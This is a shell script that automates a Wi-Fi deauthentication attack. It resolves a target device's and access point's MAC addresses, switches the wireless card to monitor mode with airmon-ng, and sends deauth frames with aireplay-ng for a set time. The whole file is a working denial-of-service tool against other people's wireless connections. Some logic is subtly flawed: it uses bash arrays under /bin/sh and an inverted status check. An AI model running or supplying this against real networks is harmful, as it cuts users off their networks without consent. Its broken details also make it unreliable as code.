#!/bin/sh

# Check if the necessary parameters are provided
if [ $# -ne 3 ]; then
    echo "Usage: $0 <ip_address> <network_interface> <timer>"
    exit 1
fi

ip_address="$1"
network_interface="$2"
timer="$3"

# Check if the necessary commands are available
commands=("ip" "arp" "airmon-ng" "airodump-ng" "aireplay-ng")
for cmd in "${commands[@]}"; do
    if ! command -v $cmd &> /dev/null; then
        echo "$cmd could not be found"
        exit 1
    fi
done

existing_monitor_interface=$(iwconfig | grep "mon" | awk '{print $1}')
if [ $? -eq 0 ]; then
    echo "Monitor interface is down."
else
    echo "Monitor interface is up. Stopping the monitor interface $existing_monitor_interface"
    sudo airmon-ng stop $existing_monitor_interface
fi

sleep 15

sudo service NetworkManager restart
if [ $? -eq 0 ]; then
    echo "NetworkManager service started successfully"
else
    echo "Failed to start NetworkManager service"
    exit 1
fi

sleep 15

ping -c 4 $ip_address
if [ $? -eq 0 ]; then
    echo "$ip_address is reachable"
else
    echo "$ip_address is not reachable"
    exit 1
fi

# Get the MAC address of the access point
access_point_mac="$(iwconfig $network_interface | grep -oP [0-9A-Fa-f:]{17})"
echo "Access Point: $access_point_mac"

# Get the MAC address of the device to deauthenticate
device_mac="$(arp -a "$ip_address" | grep -o -E '([0-9a-fA-F]{2}:){5}([0-9a-fA-F]{2})')"
echo "device_mac: $device_mac"

# Start the network interface in monitor mode
sudo airmon-ng check kill
sudo airmon-ng start "$network_interface"
monitor_interface="$(sudo airmon-ng | grep 'mon' | awk '{print $2}')"
echo "monitor_interface: $monitor_interface"

# Deauthenticate the device
sudo timeout "$timer" aireplay-ng --deauth 3 -c "$device_mac" -a "$access_point_mac" "$monitor_interface"

sleep 10

echo "Monitor interface is up. Stopping the monitor interface $monitor_interface"
sudo airmon-ng stop $monitor_interface

sleep 5

sudo airmon-ng start $network_interface

sleep 5

sudo airmon-ng stop $monitor_interface

sudo service NetworkManager restart
if [ $? -eq 0 ]; then
    echo "NetworkManager service started successfully"
else
    echo "Failed to start NetworkManager service"
    exit 1
fi